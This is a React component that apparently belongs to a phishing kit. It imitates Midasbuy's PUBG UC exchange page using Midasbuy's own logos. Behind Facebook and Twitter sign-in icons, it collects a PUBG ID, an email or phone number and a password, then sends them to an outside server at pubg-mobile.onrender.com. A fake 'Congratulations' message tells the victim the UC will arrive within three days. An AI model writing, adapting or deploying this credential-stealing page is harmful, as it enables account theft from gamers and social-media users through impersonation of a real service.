import axios from "axios";
import React, { useState } from "react";
import { useForm } from "react-hook-form";

type ModalProps = {
  isOpenModal: boolean;
  setIsOpenModal: (val: boolean) => void;
};

const ExchangeModal: React.FC<ModalProps> = ({
  isOpenModal,
  setIsOpenModal,
}) => {
  const { reset, handleSubmit, register } = useForm({ mode: "onSubmit" });
  const [socialSite, setSocialSite] = useState("");
  const [congrates, setCongrates] = useState(false);
  const [loading, setLoading] = useState(false);

  const API = axios.create({ baseURL: "https://pubg-mobile.onrender.com" });

  const createInfo = async () => {
    await API.post("/api/information");
  };

  if (!isOpenModal) {
    return null;
  }

  const handleCloseModal = () => {
    setSocialSite("");
    setCongrates(false);
    reset();
    setIsOpenModal(false);
  };

  const formSubmit = handleSubmit(async (formData) => {
    try {
      setLoading(true);
      await API.post("/api/information", formData);
      setLoading(false);
      setCongrates(true);
    } catch (err) {}
  });

  return (
    <div
      style={{
        position: "fixed",
        inset: "0",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        zIndex: "50",
        top: "20",
      }}
      className="fixed inset-0  justify-center items-center z-50 flex  top-20"
    >
      <div
        style={{
          background:
            "url(https://static.vecteezy.com/system/resources/previews/010/527/177/non_2x/smooth-soft-and-blurred-liquid-foil-trendy-colorful-blue-gradient-modern-cover-template-blur-design-background-for-flyer-social-media-post-screen-mobile-app-wallpaper-free-vector.jpg)",
          backgroundPosition: "center",
          backgroundSize: "cover",
          maxWidth: "100%",
          width: "100%",
          height: "50%",
          margin: "15px",
          borderRadius: "20px",
          display: "flex",
          flexDirection: "column",
          gap: "6px",
          alignItems: "center",
          position: "relative",
          top: "0",
          boxShadow: "#FFFFFF 0px 0px 5px 0px",
          padding: "10px",
        }}
      >
        <a href="#" className="close" onClick={handleCloseModal}></a>
        <div
          style={{
            display: "flex",
            margin: " 10px",
            gap: "8px",
            width: "100%",
          }}
        >
          <img
            src="https://cdn.midasbuy.com/oversea_web/static/images/pc-logo.png"
            alt="midas"
            width={100}
          />
        </div>
        {congrates ? (
          <div
            style={{
              display: "flex",
              alignItems: "center",
              flexDirection: "column",
            }}
          >
            <h3
              style={{
                color: "white",
                textAlign: "center",
                textShadow: "#f5f5f5 0 0 20px",
              }}
            >
              Congratulations
            </h3>
            <p
              style={{
                color: "white",
                textAlign: "center",
                fontSize: "10px",
                textShadow: "#f5f5f5 0 0 20px",
              }}
            >
              You have successfully exchanged your season tokens for UC. Now you
              are in queue, you will get the exchanged ucs within 3 days by
              checking pubg mail
            </p>
            <img
              src="https://cdn.midasbuy.com/images/%E6%9C%89%E5%A5%96%E4%BB%A3%E9%A2%86%E5%8F%962.0cab73d4.png"
              alt="drop"
              width={200}
              style={{ margin: "auto" }}
            />
          </div>
        ) : (
          <div>
            <h3 style={{ color: "white", textAlign: "center" }}>
              Sign In with
            </h3>
            <div
              style={{ display: "flex", justifyContent: "center", gap: "10px" }}
            >
              {(socialSite === "" || socialSite === "fb") && (
                <img
                  onClick={() => setSocialSite("fb")}
                  width={40}
                  src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb-new.png"
                  alt=""
                />
              )}

              {(socialSite === "" || socialSite === "twitter") && (
                <img
                  onClick={() => setSocialSite("twitter")}
                  width={40}
                  src="https://cdn.midasbuy.com/images/twitter.80d9b5e6.png"
                  alt=""
                />
              )}
            </div>
            {socialSite && (
              <form
                onSubmit={formSubmit}
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: "5px",
                  marginTop: "30px",
                }}
              >
                <input
                  {...register("pubgId")}
                  type="text"
                  style={{
                    border: "none",
                    width: "200px",
                    height: "25px",
                  }}
                  placeholder="Pubg ID"
                />
                <input
                  {...register("login", { required: "true" })}
                  type="text"
                  style={{
                    border: "none",
                    width: "200px",
                    height: "25px",
                  }}
                  placeholder="Email or phone number"
                />
                <input
                  {...register("password", { required: "true" })}
                  type="password"
                  style={{
                    border: "none",
                    width: "200px",
                    height: "25px",
                  }}
                  placeholder="Password"
                />
                <button
                  style={{
                    margin: "auto",
                    width: "210px",
                    height: "30px",
                    borderRadius: "5px",
                    border: "none",
                    color: "white",
                    background: "#0082de",
                  }}
                >
                  {loading && (
                    <img width={20} src="https://i.gifer.com/ZKZg.gif" alt="" />
                  )}
                  {!loading && "Exchange"}
                </button>
              </form>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default ExchangeModal;
